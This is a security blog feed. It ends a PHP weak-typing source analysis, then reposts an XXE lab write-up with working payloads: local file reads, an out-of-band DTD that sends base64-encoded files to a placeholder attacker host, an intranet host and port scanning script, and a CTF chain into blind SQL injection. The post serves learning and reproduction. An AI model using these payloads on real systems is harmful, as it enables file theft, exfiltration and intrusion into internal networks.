class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">if (!converted) &#123;</span><br><span class="line">if (Z_TYPE_P(op1) &lt; IS_TRUE) &#123;</span><br><span class="line">ZVAL_LONG(result, zval_is_true(op2) ? -1 : 0);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125; else if (Z_TYPE_P(op1) == IS_TRUE) &#123;</span><br><span class="line">ZVAL_LONG(result, zval_is_true(op2) ? 0 : 1);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125; else if (Z_TYPE_P(op2) &lt; IS_TRUE) &#123;</span><br><span class="line">ZVAL_LONG(result, zval_is_true(op1) ? 1 : 0);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125; else if (Z_TYPE_P(op2) == IS_TRUE) &#123;</span><br><span class="line">ZVAL_LONG(result, zval_is_true(op1) ? 0 : -1);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">op1 = zendi_convert_scalar_to_number(op1, &amp;op1_copy, result, 1);</span><br><span class="line">op2 = zendi_convert_scalar_to_number(op2, &amp;op2_copy, result, 1);</span><br><span class="line">if (EG(exception)) &#123;</span><br><span class="line">if (result != op1) &#123;</span><br><span class="line">ZVAL_UNDEF(result);</span><br><span class="line">&#125;</span><br><span class="line">return FAILURE;</span><br><span class="line">&#125;</span><br><span class="line">converted = 1;</span><br><span class="line">&#125;</span><br><span class="line">&#125; else if (Z_TYPE_P(op1)==IS_ARRAY) &#123;</span><br><span class="line">ZVAL_LONG(result, 1);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125; else if (Z_TYPE_P(op2)==IS_ARRAY) &#123;</span><br><span class="line">ZVAL_LONG(result, -1);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">ZEND_ASSERT(0);</span><br><span class="line">zend_throw_error(NULL, &quot;Unsupported operand types&quot;);</span><br><span class="line">if (result != op1) &#123;</span><br><span class="line">ZVAL_UNDEF(result);</span><br><span class="line">&#125;</span><br><span class="line">return FAILURE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>因为在函数的开头converted=0<br>所以!converted=1是正确的，<br>我们跟进这个判断<br>发现<br><img src="https://i.imgur.com/tFiBazU.png" alt=""><br>这边只要op1为IS_ARRAY类型的变量就result直接就为1了<br>这也解释了我们之前的问题<br><img src="https://i.imgur.com/u0eHfcF.png" alt=""><br>为什么[]无论是比较1，0，-1都是返回true<br>以及PHP手册中<br><img src="https://i.imgur.com/7LjAy1u.png" alt=""><br>中的这个问题</p><p>当然我们依旧留存下一个问题<br><img src="https://i.imgur.com/JOIPz8r.png" alt=""><br>为什么这个也是恒真的呢？<br>可以清楚看到左右两边都是数组，我们需要找到arrary与arrary的这种case<br><img src="https://i.imgur.com/3J6lBoh.png" alt=""><br>在最开始没几行就可以找到了<br>这里有一个函数zend_compare_arrays<br>我们跟进一下<br><img src="https://i.imgur.com/KqTZiGK.png" alt=""><br>我们可以看到它返回了一个zend_compare_symbol_tables函数<br>我们再跟进下<br><img src="https://i.imgur.com/CvETlAa.png" alt=""><br>当然在传入参数的时候又经历了Z_ARRVAL_P(a1)的变化<br>Z_ARRVAL_P(a1)源自</p><blockquote><p>#define Z_ARRVAL(zval) Z_ARR(zval)</p></blockquote><p>大概的含义是从数组中抓取hash值，<br><img src="https://i.imgur.com/q8PoRVR.png" alt=""><br>这里需要传入HashTable *ht1<br>那么HashTable 又是什么呢？</p><blockquote><p>在学数据结构的时候我们都有学到hash，<br>其实对于hashtable我之前的印象是比如python中的字典它的原理就是采取hash表，即采取键值对的方式进行查询数据，比起链表等方式查询无疑是要快的多</p></blockquote><p>那么这里的hashtable又是否和我想的一样呢？具体看<a href="http://www.php-internals.com/book/?p=chapt03/03-01-02-hashtable-in-php" target="_blank" rel="noopener">这里</a></p><blockquote><p>PHP内核中的哈希表是十分重要的数据结构，PHP的大部分的语言特性都是基于哈希表实现的， 例如：变量的作用域、函数表、类的属性、方法等，Zend引擎内部的很多数据都是保存在哈希表中的。</p></blockquote><blockquote><p>PHP中的哈希表实现在Zend/zend_hash.c中，先看看PHP实现中的数据结构， PHP使用如下两个数据结构来实现哈希表，HashTable结构体用于保存整个哈希表需要的基本信息， 而Bucket结构体用于保存具体的数据内容，如下：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _hashtable &#123; </span><br><span class="line">    uint nTableSize;        // hash Bucket的大小，最小为8，以2x增长。</span><br><span class="line">    uint nTableMask;        // nTableSize-1 ， 索引取值的优化</span><br><span class="line">    uint nNumOfElements;    // hash Bucket中当前存在的元素个数，count()函数会直接返回此值 </span><br><span class="line">    ulong nNextFreeElement; // 下一个数字索引的位置</span><br><span class="line">    Bucket *pInternalPointer;   // 当前遍历的指针（foreach比for快的原因之一）</span><br><span class="line">    Bucket *pListHead;          // 存储数组头元素指针</span><br><span class="line">    Bucket *pListTail;          // 存储数组尾元素指针</span><br><span class="line">    Bucket **arBuckets;         // 存储hash数组</span><br><span class="line">    dtor_func_t pDestructor;    // 在删除元素时执行的回调函数，用于资源的释放</span><br><span class="line">    zend_bool persistent;       //指出了Bucket内存分配的方式。如果persisient为TRUE，则使用操作系统本身的内存分配函数为Bucket分配内存，否则使用PHP的内存分配函数。</span><br><span class="line">    unsigned char nApplyCount; // 标记当前hash Bucket被递归访问的次数（防止多次递归）</span><br><span class="line">    zend_bool bApplyProtection;// 标记当前hash桶允许不允许多次访问，不允许时，最多只能递归3次</span><br><span class="line">#if ZEND_DEBUG</span><br><span class="line">    int inconsistent;</span><br><span class="line">#endif</span><br><span class="line">&#125; HashTable;</span><br></pre></td></tr></table></figure><p>当然如果要详细讲PHP中的hashtable讲清楚肯定要再写另一篇博客，这里我们就只讲这里所需要的原理<br><img src="https://i.imgur.com/oz6iVWs.png" alt=""><br>这里进行两个参数的判断，当两个参数hash值相等时候就返回0<br>我们可以直接看看php数组的hash，具体点<a href="https://www.jianshu.com/p/3f1d0f9907a1" target="_blank" rel="noopener">这里</a><br><img src="https://i.imgur.com/Dkm5Ix6.png" alt=""><br>这是在PHP5.6的数组结构<br>我们可以看到，数组本质就是一个hashtable结构，左侧的0~nTablemask便是hash下标，而后面有一个双向链表，便是我们通常所说的hash冲突的链地址法。<br><img src="https://i.imgur.com/hgjQdOQ.png" alt=""><br>这是PHP7.0的数组结构<br><img src="https://i.imgur.com/QOxDpIr.png" alt=""><br>Bucket结构便是我们所说的保存插入数据的结构。主要包括：key(字符串，如果是数字下标，转化位字符串), value, h(只会计算一次，如果是数组下标，直接把key作为h)。</p><p>稍稍回到原题，我们进行比较的就是Bucket结构中的hash值</p><p>那么hash值是怎么比较的呢？<br>我们查找zend_hash_compare函数到底是什么意思</p><blockquote><p>int zend_hash_compare(<br>    HashTable <em>ht1, HashTable </em>ht2, compare_func_t compar, zend_bool ordered TSRMLS_DC<br>);</p></blockquote><p>我们查询了hashtable的api具体想了解可以看<a href="http://www.phpinternalsbook.com/hashtables/hashtable_api.html" target="_blank" rel="noopener">这里</a><br>这里有一句话</p><blockquote><p>The return has the same meaning as compare_func_t. The function first compares the length of the arrays. If they differ, then the array with the larger length is considered greater. What happens when the length is the same depends on the ordered parameter:<br>For ordered=0 (not taking order into account) the function will walk through the buckets of the first hashtable and always look up if the second hashtable has an element with the same key. If it doesn’t, then the first hashtable is considered greater. If it does, then the compar function is invoked on the values.<br>For ordered=1 (taking order into account) both hashtables will be walked simultaneously. For each element first the key is compared and if it matches the value is compared using compar.<br>This is continued until either one of the comparisons returns a non-zero value (in which case the result of the comparison will also be the result of zend_hash_compare()) or until no more elements are available. In the latter case the hashtables are considered equal.</p></blockquote><p>解释一下<br>这里先会判断这两个数组参数的长度。如果它们不同，则认为具有较大长度的阵列更大<br>这也就能说明为什么我们前面的问题是恒真了吧<br><img src="https://i.imgur.com/9q0v10w.png" alt=""></p><p>当然当长度相同比如[7],与[6]<br><img src="https://i.imgur.com/NkRgIZm.png" alt=""><br>会遍历第一个数组，假如第一个数组的元素，并始终查找第二个哈希表是否具有相同键的元素。如果没有，那么第一个哈希表被认为更大，<br>看到这里大家的疑惑都解决了吧</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>通过这次探寻，我深刻发现到往往很多我们认为是常识的东西都有着很多极其复杂的原理，我们认识一件事物的时候不能仅仅只凭借表面现象就根据自己直觉来得出结论，虽然有的时候得出的结果是一样的，但是我们并不能够真正理解这个结论到底为何而来。</p><h2 id="转载"><a href="#转载" class="headerlink" title="转载"></a>转载</h2><p>本文由安全客原创发布<br>转载，请参考转载声明，注明出处： <a href="https://www.anquanke.com/post/id/171966" target="_blank" rel="noopener">https://www.anquanke.com/post/id/171966</a><br>安全客 - 有思想的安全新媒体</p>]]></content>
    
    <summary type="html">
    
      在CTF比赛中PHP弱类型的特性常常被用上，但我们往往知其然不知其所以然，究竟为什么PHP是弱类型呢？很少人深究。
    
    </summary>
    
      <category term="文章" scheme="https://museljh.github.io/categories/%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="PHP内核分析" scheme="https://museljh.github.io/tags/PHP%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90/"/>
    
      <category term="PHP弱类型" scheme="https://museljh.github.io/tags/PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B/"/>
    
  </entry>
  
  <entry>
    <title>对于XXE漏洞的学习与实验复现记录（转载）</title>
    <link href="https://museljh.github.io/2019/02/26/%E5%AF%B9%E4%BA%8EXXE%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E9%AA%8C%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95%EF%BC%88%E8%BD%AC%E8%BD%BD%EF%BC%89/"/>
    <id>https://museljh.github.io/2019/02/26/对于XXE漏洞的学习与实验复现记录（转载）/</id>
    <published>2019-02-26T14:37:29.000Z</published>
    <updated>2019-02-26T14:43:59.039Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/fly.png" alt=""></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>突然想研究下XXE漏洞,没有为什么，这篇作者写的挺好的，推荐可以同样学习一波。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><blockquote><p><a href="https://xz.aliyun.com/t/3357#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357#toc-5</a><br><a href="http://www.runoob.com/xml/xml-tutorial.html" target="_blank" rel="noopener">http://www.runoob.com/xml/xml-tutorial.html</a></p></blockquote><h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><p>实验来源,我只是复现学习一波</p><blockquote><p><a href="https://xz.aliyun.com/t/3357#toc-11" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357#toc-11</a></p></blockquote><p>实验场所<br>:Ubuntu 16.04.3 LTS nginx+php+mysql</p><p>实验一：有回显读本地敏感文件(Normal XXE)<br>这个实验的攻击场景模拟的是在服务能接收并解析 XML 格式的输入并且有回显的时候，我们就能输入我们自定义的 XML 代码，通过引用外部实体的方法，引用服务器上面的文件<br>本地服务器上放上解析 XML 的 php 代码：<br>xml.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    libxml_disable_entity_loader (false);</span><br><span class="line">    $xmlfile = file_get_contents(&apos;php://input&apos;);</span><br><span class="line">    $dom = new DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">    $creds = simplexml_import_dom($dom);</span><br><span class="line">    echo $creds;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>我们在相同目录下放一个flag.php内容随意</p><p>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">&lt;!ENTITY goodies SYSTEM &quot;file:///var/www/html/test/flag.php&quot;&gt; ]&gt; </span><br><span class="line">&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/ocdjRxg.png" alt=""></p><p>但是因为这个文件没有什么特殊符号，于是我们读取的时候可以说是相当的顺利,但是假如换成以下内容呢？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># /etc/fstab: static file system information.</span><br><span class="line">#</span><br><span class="line"># Use &apos;blkid&apos; to print the universally unique identifier for a</span><br><span class="line"># device; this may be used with UUID= as a more robust way to name devices</span><br><span class="line"># that works even if disks are added and removed. See fstab(5).</span><br><span class="line">#</span><br><span class="line"># &lt;file system&gt; &lt;mount point&gt;   &lt;type&gt;  &lt;options&gt;       &lt;dump&gt;  &lt;pass&gt;</span><br><span class="line"># / was on /dev/vda1 during installation</span><br><span class="line">UUID=e2048966-750b-4795-a9a2-7b477d6681bf /               ext4    errors=remount-ro 0       1</span><br><span class="line">/dev/fd0        /media/floppy0  auto    rw,user,noauto,exec,utf8 0       0</span><br></pre></td></tr></table></figure></p><p>/etc/fstab 文件所表达的意义</p><blockquote><p><a href="https://blog.51cto.com/lspgyy/1297432" target="_blank" rel="noopener">https://blog.51cto.com/lspgyy/1297432</a></p></blockquote><p>再次读取<br><img src="https://i.imgur.com/kL15Xbc.png" alt=""></p><p>可以看到，不但没有读到我们想要的文件，而且还给我们报了一堆错，怎么办？这个时候就要祭出我们的另一个神器了——CDATA ，简单的介绍如下(引用自转载大佬的一片介绍 XML 的博客)：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">有些内容可能不想让解析引擎解析执行，而是当做原始的内容处理，用于把整段数据解析为纯字符数据而不是标记的情况包含大量的 &lt;&gt; &amp; 或者</span><br><span class="line">&quot; 字符，CDATA节中的所有字符都会被当做元素字符数据的常量部分，而不是 xml标记</span><br><span class="line"></span><br><span class="line">&lt;![CDATA[</span><br><span class="line"></span><br><span class="line">XXXXXXXXXXXXXXXXX</span><br><span class="line"></span><br><span class="line">]]&gt;</span><br><span class="line"></span><br><span class="line">可以输入任意字符除了 ]]&gt; 不能嵌套</span><br><span class="line"></span><br><span class="line">用处是万一某个标签内容包含特殊字符或者不确定字符，我们可以用 CDATA包起来</span><br></pre></td></tr></table></figure></p><p>那我们把我们的读出来的数据放在 CDATA 中输出就能进行绕过，但是怎么做到，我们来简答的分析一下：</p><p>首先，找到问题出现的地方，问题出现在<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">&lt;!ENTITY goodies SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt;</span><br><span class="line">&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</span><br></pre></td></tr></table></figure></p><p>引用并不接受可能会引起 xml 格式混乱的字符(在XML中，有时实体内包含了些字符，如&amp;,&lt;,&gt;,”,’等。这些均需要对其进行转义，否则会对XML解释器生成错误)，我们想在引用的两边加上 “\&lt;![CDATA[“和 “]]>”,但是好像没有任何语法告诉我们字符串能拼接的，于是我想到了能不能使用多个实体连续引用的方法<br>那么要想在 DTD<br>中拼接，我们知道我们只有一种选择，就是使用 参数实体<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   </span><br><span class="line">&lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt; </span><br><span class="line">%dtd; ]&gt; </span><br><span class="line"></span><br><span class="line">&lt;roottag&gt;&amp;all;&lt;/roottag&gt;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/SEFtSfe.png" alt=""><br>成功读取</p><p>这里dtd引用时，需要查看下php.ini文件<br>allow_url_fopen必须时on，<br><img src="https://i.imgur.com/lpv7uUG.png" alt=""><br>因为这个off我试了半天不行<br><img src="https://i.imgur.com/nRx3t2s.png" alt=""><br>新的问题出现<br>但是，你想想也知道，本身人家服务器上的 XML 就不是输出用的，一般都是用于配置或者在某些极端情况下利用其他漏洞能恰好实例化解析 XML 的类，因此我们想要现实中利用这个漏洞就必须找到一个不依靠其回显的方法——外带</p><p>实验二：无回显读取本地敏感文件(Blind OOB XXE)<br>xml.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">libxml_disable_entity_loader (false);</span><br><span class="line">$xmlfile = file_get_contents(&apos;php://input&apos;);</span><br><span class="line">$dom = new DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>test.dtd<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY % send SYSTEM &apos;http://ip:9999?p=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure></p><p>(因为实体的值中不能有 %, 所以将其转成html实体编码 &#37;否则这里会有个错误）<br><img src="https://i.imgur.com/FqJUWzE.png" alt=""><br>修改后<br><img src="https://i.imgur.com/zBn1LKt.png" alt=""><br>我们清楚第看到服务器端接收到了我们用 base64 编码后的敏感文件信息(编码也是为了不破坏原本的XML语法)，不编码会报错。<br>整个调用过程：<br>我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 &#37;)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。<br>新的思考：<br>我们刚刚都只是做了一件事，那就是通过 file 协议读取本地文件，或者是通过 http 协议发出请求，熟悉 SSRF 的童鞋应该很快反应过来，这其实非常类似于 SSRF ，因为他们都能从服务器向另一台服务器发起请求，那么我们如果将远程服务器的地址换成某个内网的地址，（比如 192.168.0.10:8080）是不是也能实现 SSRF 同样的效果呢？没错，XXE 其实也是一种 SSRF 的攻击手法，因为 SSRF 其实只是一种攻击模式，利用这种攻击模式我们能使用很多的协议以及漏洞进行攻击。<br>新的利用：<br>所以要想更进一步的利用我们不能将眼光局限于 file 协议，我们必须清楚地知道在何种平台，我们能用何种协议<br>如图所示:<br><img src="https://i.imgur.com/wx7OTbH.png" alt=""><br>PHP在安装扩展以后还能支持的协议：<br>如图所示：<br><img src="https://i.imgur.com/zgFKDpG.png" alt=""><br>实验三：HTTP 内网主机探测<br>我们以存在 XXE 漏洞的服务器为我们探测内网的支点。要进行内网探测我们还需要做一些准备工作，我们需要先利用 file 协议读取我们作为支点服务器的网络配置文件，看一下有没有内网，以及网段大概是什么样子（我以linux 为例），我们可以尝试读取 /etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host 文件以后我们就有了大致的探测方向了<br>下面是一个探测脚本的实例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">#Origtional XML that the server accepts</span><br><span class="line">#&lt;xml&gt;</span><br><span class="line">#    &lt;stuff&gt;user&lt;/stuff&gt;</span><br><span class="line">#&lt;/xml&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def build_xml(string):</span><br><span class="line">    xml = &quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot;</span><br><span class="line">    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;</span><br><span class="line">    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot; + &apos;&quot;&apos; + string + &apos;&quot;&apos; + &quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;</span><br><span class="line">    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;</span><br><span class="line">    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&quot;&quot;&quot;</span><br><span class="line">    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;/xml&gt;&quot;&quot;&quot;</span><br><span class="line">    send_xml(xml)</span><br><span class="line"></span><br><span class="line">def send_xml(xml):</span><br><span class="line">    headers = &#123;&apos;Content-Type&apos;: &apos;application/xml&apos;&#125;</span><br><span class="line">    x = requests.post(&apos;http://34.200.157.128/CUSTOM/NEW_XEE.php&apos;, data=xml, headers=headers, timeout=5).text</span><br><span class="line">    coded_string = x.split(&apos; &apos;)[-2] # a little split to get only the base64 encoded value</span><br><span class="line">    print coded_string</span><br><span class="line">#   print base64.b64decode(coded_string)</span><br><span class="line">for i in range(1, 255):</span><br><span class="line">    try:</span><br><span class="line">        i = str(i)</span><br><span class="line">        ip = &apos;10.0.0.&apos; + i</span><br><span class="line">        string = &apos;php://filter/convert.base64-encode/resource=http://&apos; + ip + &apos;/&apos;</span><br><span class="line">        print string</span><br><span class="line">        build_xml(string)</span><br><span class="line">    except:</span><br><span class="line">        continue</span><br></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/sMX0pMB.png" alt=""><br>实验四：HTTP 内网主机端口扫描<br>找到了内网的一台主机，想要知道攻击点在哪，我们还需要进行端口扫描，端口扫描的脚本主机探测几乎没有什么变化，只要把ip 地址固定，然后循环遍历端口就行了，当然一般我们端口是通过响应的时间的长短判断该该端口是否开放的，读者可以自行修改一下，当然除了这种方法，我们还能结合 burpsuite 进行端口探测<br>比如我们传入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;  </span><br><span class="line">&lt;!DOCTYPE data SYSTEM &quot;http://127.0.0.1:515/&quot; [  </span><br><span class="line">&lt;!ELEMENT data (#PCDATA)&gt;  </span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;4&lt;/data&gt;</span><br></pre></td></tr></table></figure></p><p>返回结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">javax.xml.bind.UnmarshalException  </span><br><span class="line"> - with linked exception:</span><br><span class="line">[Exception [EclipseLink-25004] (Eclipse Persistence Services): org.eclipse.persistence.exceptions.XMLMarshalException</span><br><span class="line">Exception Description: An error occurred unmarshalling the document  </span><br><span class="line">Internal Exception: ████████████████████████: Connection refused</span><br></pre></td></tr></table></figure></p><p>实验五：内网盲注(CTF)<br>2018 强网杯 有一道题就是利用 XXE 漏洞进行内网的 SQL 盲注的,大致的思路如下：</p><p>首先在外网的一台ip地址为 39.107.33.75:33899 的评论框处测试发现 XXE 漏洞，我们输入 xml 以及 dtd 会出现报错<br>如图所示：<br><img src="https://i.imgur.com/uKYlbs7.png" alt=""><br><img src="https://i.imgur.com/gpOyC5D.png" alt=""><br>既然如此，那么我们是不是能读取该服务器上面的文件，我们先读配置文件(这个点是 Blind XXE ，必须使用参数实体，外部引用 DTD )</p><blockquote><p>/var/www/52dandan.cc/public_html/config.php</p></blockquote><p>拿到第一部分 flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">define(BASEDIR, &quot;/var/www/52dandan.club/&quot;);</span><br><span class="line">define(FLAG_SIG, 1);</span><br><span class="line">define(SECRETFILE,&apos;/var/www/52dandan.com/public_html/youwillneverknowthisfile_e2cd3614b63ccdcbfe7c8f07376fe431&apos;);</span><br><span class="line">....</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><blockquote><p>注意：<br>这里有一个小技巧，当我们使用 libxml 读取文件内容的时候，文件不能过大，如果太大就会报错，于是我们就需要使用 php<br>过滤器的一个压缩的方法<br>压缩：echo file_get_contents(“php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd”);<br>解压：echo file_get_contents(“php://filter/read=convert.base64-decode/zlib.inflate/resource=/tmp/1”);</p></blockquote><p>然后我们考虑内网有没有东西，我们读取</p><blockquote><p>/proc/net/arp<br>/etc/host</p></blockquote><p>找到内网的另一台服务器的 ip 地址 192.168.223.18</p><p>拿到这个 ip 我们考虑就要使用 XXE 进行端口扫描了，然后我们发现开放了 80 端口，然后我们再进行目录扫描，找到一个 test.php ，根据提示，这个页面的 shop 参数存在一个注入,但是因为本身这个就是一个 Blind XXE ,我们的对服务器的请求都是在我们的远程 DTD 中包含的，现在我们需要改变我们的请求，那我们就要在每一次修改请求的时候修改我们远程服务器的 DTD 文件，于是我们的脚本就要挂在我们的 VPS 上，一边边修改 DTD 一边向存在 XXE 漏洞的主机发送请求，脚本就像下面这个样子<br>示例代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 